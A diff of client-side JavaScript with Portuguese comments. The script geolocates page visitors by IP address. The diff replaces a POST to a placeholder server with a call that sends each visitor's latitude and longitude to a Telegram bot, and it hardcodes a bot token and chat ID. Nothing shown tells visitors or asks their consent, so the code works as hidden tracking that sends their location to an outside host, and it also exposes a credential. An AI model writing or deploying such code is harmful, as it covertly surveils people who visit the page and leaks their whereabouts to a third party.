@@ -49,21 +49,25 @@
           pais: data.country,
         };
 
-        // Envia os dados de localização para um servidor ou bot (substitua a URL do seu servidor)
-        fetch('https://seu-servidor-ou-bot-url.com/enviar-localizacao', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(locationData),
-        })
-        .then(response => response.json())
-        .then(data => {
-          console.log('Localização enviada com sucesso:', data);
-        })
-        .catch(error => {
-          console.error('Erro ao enviar localização:', error);
-        });
+        // Obtenha as coordenadas de latitude e longitude
+        const location = data.loc.split(',');
+
+        const latitude = location[0];
+        const longitude = location[1];
+
+        // Defina o token do bot e o chat_id
+        const botToken = '7757093107:AAHFmLastbU0lkV5f2AdeiNXHoxckQsJVy4';
+        const chatId = '1276935257';
+
+        // Envia a localização para o bot do Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
+          .then(response => response.json())
+          .then(data => {
+            console.log('Localização enviada para o Telegram:', data);
+          })
+          .catch(error => {
+            console.error('Erro ao enviar localização para o Telegram:', error);
+          });
       })
       .catch(error => {
         console.error('Erro ao obter localização via IP:', error);
